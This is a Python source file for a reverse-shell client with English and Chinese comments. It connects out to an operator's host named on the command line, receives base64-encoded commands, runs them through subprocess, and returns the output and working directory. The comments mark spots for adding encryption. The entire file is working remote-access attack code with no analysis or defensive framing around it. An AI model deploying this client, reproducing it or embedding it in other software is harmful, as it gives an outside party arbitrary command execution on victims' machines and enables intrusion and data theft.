# coding:utf-8
# author:Joseph

import socket
import os
import subprocess
import sys
import base64

SERVER_HOST = sys.argv[1]
SERVER_PORT = 12123
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

# create the socket object
s = socket.socket()
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))
# get the current directory
cwd = os.getcwd()
s.send(cwd.encode())

while True:
    # receive the command from the server
    # !!could ADD encrypted model!!
    # 添加指令解密功能
    # str(base64.b64decode(client_socket.recv(BUFFER_SIZE).decode()), 'utf-8')
    # command = s.recv(BUFFER_SIZE).decode()
    command = str(base64.b64decode(s.recv(BUFFER_SIZE).decode()),'utf-8')
    splited_command = command.split()
    # 指令生效模块
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    if splited_command[0].lower() == "cd":
        # cd command, change directory
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            # if there is an error, set as the output
            output = str(e)
        else:
            # if operation is successful, empty message
            output = ""
    else:
        # execute the command and retrieve the results
        output = subprocess.getoutput(command)
    # get the current working directory as output
    cwd = os.getcwd()
    # send the results back to the server
    # !!could ADD encrypted model!!
    # 命令回显返回，添加指令加密模块
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(base64.b64encode(message.encode()))
    # print(message.encode())
    # print(base64.b64encode(message.encode()))
    # 以上两步可生效
    # s.send(message.encode())
# close client connection
s.close()